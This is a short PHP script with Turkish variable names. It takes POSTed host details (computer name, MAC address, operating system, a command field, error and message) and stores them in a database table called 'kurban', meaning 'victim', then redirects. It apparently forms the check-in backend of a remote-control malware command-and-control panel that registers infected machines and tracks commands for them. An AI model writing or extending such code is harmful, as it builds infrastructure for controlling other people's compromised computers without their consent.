<?php
include("vt.php");
ob_start();

		$bilgisayaradi=htmlspecialchars(strip_tags($_POST['bilgisayaradi']));
			$acik=htmlspecialchars(strip_tags($_POST['acik']));
			$macadres=htmlspecialchars(strip_tags($_POST['macadres']));
			$komut=htmlspecialchars(strip_tags($_POST['komut']));
			$isletim=htmlspecialchars(strip_tags($_POST['isletim']));						$hata=htmlspecialchars(strip_tags($_POST['hata']));						$mesag=htmlspecialchars(strip_tags($_POST['mesag']));
				$acik="1";
				if($macadres){
				
				$SqlSorgusu = "INSERT INTO kurban (bilgisayaradi,acik,macadres,komut,isletim,hata,mesag) VALUES (:bilgisayaradi, :acik, :macadres, :komut, :isletim, :hata, :mesag)";
				$st = $db->prepare($SqlSorgusu);
				$st->bindParam(':bilgisayaradi', $bilgisayaradi,PDO::PARAM_STR);
				$st->bindParam(':acik', $acik,PDO::PARAM_STR);
				$st->bindParam(':macadres', $macadres,PDO::PARAM_STR);
				$st->bindParam(':komut', $komut,PDO::PARAM_STR);
				$st->bindParam(':isletim', $isletim,PDO::PARAM_STR);								$st->bindParam(':hata', $hata,PDO::PARAM_STR);								$st->bindParam(':mesag', $mesag,PDO::PARAM_STR);
				$st->execute();
				header("Location:verigir.php");
			
		}else{
			header("Location:verigir.php");
		}
				ob_end_flush();
?>